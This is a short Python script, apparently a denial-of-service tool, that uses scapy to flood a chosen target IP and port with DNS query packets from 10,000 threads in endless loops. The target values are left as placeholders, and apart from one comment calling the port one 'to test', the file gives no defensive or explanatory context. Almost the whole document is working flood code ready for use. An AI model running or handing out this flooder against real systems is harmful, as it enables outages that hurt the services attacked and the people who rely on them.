from scapy.all import *
import threading

# Configuration
target_ip = 'ip_here' # IP target 
target_port = port_here # Port to test
num_threads = 10000  # Number of thread (vs CPU usage)

def send_dns_flood(target_ip, target_port):
    while True:
        try:
            dns_request = IP(dst=target_ip)/UDP(dport=target_port)/DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(dns_request, verbose=False)
            print(f"Sent DNS request to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending DNS request: {e}")

def start_dns_flood(target_ip, target_port, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_dns_flood, args=(target_ip, target_port))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"Started thread for DNS flood")

    # Wait for thread ending
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Start Flooding
    start_dns_flood(target_ip, target_port, num_threads)
